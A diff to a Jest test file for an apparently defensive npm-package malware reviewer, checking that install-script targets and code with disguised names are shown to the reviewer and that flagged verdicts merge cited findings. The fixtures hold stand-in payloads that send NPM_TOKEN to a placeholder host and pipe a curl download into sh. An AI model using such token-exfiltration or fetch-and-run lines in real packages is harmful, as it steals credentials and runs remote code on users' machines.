@@ -147,9 +147,10 @@ describe("review input", () => {
       "dist/bin/post-install.js": "console.log('hello from the stand-in');\n",
       "lib/index.js": "module.exports = require('./deep/helper');\n",
       "lib/deep/helper.js": "module.exports = 1;\n",
-      "a/b/c/unrelated-1.js": filler(1200),
-      "a/b/c/unrelated-2.js": filler(1200),
-      "a/b/c/unrelated-3.js": filler(1200),
+      // shallower and larger than the helper, so only the import from lib/index.js puts the helper first
+      "unrelated-1.js": filler(1200),
+      "unrelated-2.js": filler(1200),
+      "unrelated-3.js": filler(1200),
       "logo.png": "\u0000PNG",
     });
 
@@ -158,11 +159,52 @@ describe("review input", () => {
     expect(input.read).toContain("dist/bin/post-install.js");
     expect(input.read).toContain("lib/deep/helper.js");
     expect(input.text.indexOf("=== FILE dist/bin/post-install.js")).toBeLessThan(input.text.indexOf("=== FILE lib/index.js"));
-    expect(input.text.indexOf("=== FILE lib/deep/helper.js")).toBeLessThan(input.text.indexOf("=== FILE a/b/c/unrelated-1.js"));
+    expect(input.text.indexOf("=== FILE lib/deep/helper.js")).toBeGreaterThan(-1);
+    expect(input.text.indexOf("=== FILE lib/deep/helper.js")).toBeLessThan(input.text.indexOf("=== FILE unrelated-1.js"));
     expect(input.notRead).toContainEqual({ kind: "file", path: "logo.png", reason: "binary" });
     expect(input.notRead).toContainEqual({ kind: "dependency", name: "leftpad" });
     expect(input.notRead.some((n) => n.kind === "file" && (n.reason === "budget" || n.reason === "partial"))).toBe(true);
     expect(input.coverage).toEqual({ mode: "files", previousVersion: null, filesInScope: 7, filesRead: input.read.length });
+  });
+
+  test("code named like a doc, and an install target of any extension, are shown", () => {
+    const payload = "require('https').get('https://collector.example.invalid/?t=' + process.env.NPM_TOKEN);\n";
+
+    for (const target of ["history.js", "lib/notice.js", "LICENSE.js", "setup.txt"]) {
+      const pkg = pkgOf({ "package.json": JSON.stringify({ name: "stand-in", version: "1.0.0", scripts: { postinstall: `node ${target}` } }), "index.js": "module.exports = 1;\n", [target]: payload });
+      const input = buildFilesInput({ name: "stand-in", version: "1.0.0", pkg });
+
+      expect(input.read).toContain(target);
+      expect(input.text).toContain(`=== FILE ${target} ===`);
+      expect(input.coverage.filesInScope).toBe(3);
+    }
+
+    // not an install target: code by its extension, so still shown
+    const plain = buildFilesInput({ name: "stand-in", version: "1.0.0", pkg: pkgOf({ "package.json": "{}", "src/historyUtils.js": payload, "CHANGELOG.md": "# 1.0.0\n", "index.d.ts": "export {};\n" }) });
+
+    expect(plain.read).toEqual(["package.json", "src/historyUtils.js"]);
+  });
+
+  test("a program an install script runs directly, and a Node entry, are shown whatever their extension", () => {
+    const script = "#!/bin/sh\ncurl -s https://collector.example.invalid/x | sh\n";
+
+    const cases = [
+      { manifest: { scripts: { postinstall: "./setup.txt" } }, path: "setup.txt", body: script },
+      { manifest: { scripts: { postinstall: "FOO=1 ./bin/notes.md --quiet" } }, path: "bin/notes.md", body: script },
+      // the same file through a shell, unquoted after -c and named after bash
+      { manifest: { scripts: { postinstall: "sh -c ./setup.txt" } }, path: "setup.txt", body: script },
+      { manifest: { scripts: { install: "bash setup.txt" } }, path: "setup.txt", body: script },
+      { manifest: { main: "entry.txt" }, path: "entry.txt", body: "require('https').get('https://collector.example.invalid/');\n" },
+    ];
+
+    for (const c of cases) {
+      const pkg = pkgOf({ "package.json": JSON.stringify({ name: "stand-in", version: "1.0.0", ...c.manifest }), "index.js": "module.exports = 1;\n", [c.path]: c.body });
+      const input = buildFilesInput({ name: "stand-in", version: "1.0.0", pkg });
+
+      expect(input.text).toContain(`=== FILE ${c.path} ===`);
+      expect(input.read).toContain(c.path);
+      expect(input.coverage.filesInScope).toBe(3);
+    }
   });
 
   test("files where the rule-based signals fired come before plain code", () => {
@@ -265,6 +307,25 @@ describe("decide", () => {
     ["an uncited flag, then benign", uncited, benign, "benign"],
   ])("%s", (_label, a, b, want) => {
     expect(outcome(a, b)).toBe(want);
+  });
+
+  test("a flag is malicious when a cited answer said so, and its findings merge one per line, most severe first", () => {
+    const files = [entry("a.js", "one\ntwo\nthree\n")];
+    const cite = (line: number, quote: string, severity: "high" | "medium" | "low") => verifyCitations([finding({ file: "a.js", line, quote, severity })], files).kept;
+    const suspicious: Attempt = { kind: "answer", verdict: "suspicious", summary: "odd", findings: [...cite(1, "one", "low"), ...cite(2, "two", "medium")], dropped: [] };
+    const malicious: Attempt = { kind: "answer", verdict: "malicious", summary: "bad", findings: [...cite(2, "two", "medium"), ...cite(3, "three", "high")], dropped: [] };
+    const malUncited: Attempt = { kind: "answer", verdict: "malicious", summary: "?", findings: [], dropped: [] };
+
+    const flag = (a: Attempt, b: Attempt) => {
+      const s = decide([a, b]);
+
+      return s.kind === "done" && s.decision.outcome === "flagged" ? s.decision : null;
+    };
+
+    expect(flag(suspicious, malicious)?.verdict).toBe("malicious");
+    expect(flag(suspicious, suspicious)?.verdict).toBe("suspicious");
+    expect(flag(suspicious, malUncited)?.verdict).toBe("suspicious");
+    expect(flag(suspicious, malicious)?.findings.map((f) => `${f.line}:${f.severity}`)).toEqual(["3:high", "2:medium", "1:low"]);
   });
 
   test("replaying the eval's first answers reproduces its flag counts", () => {
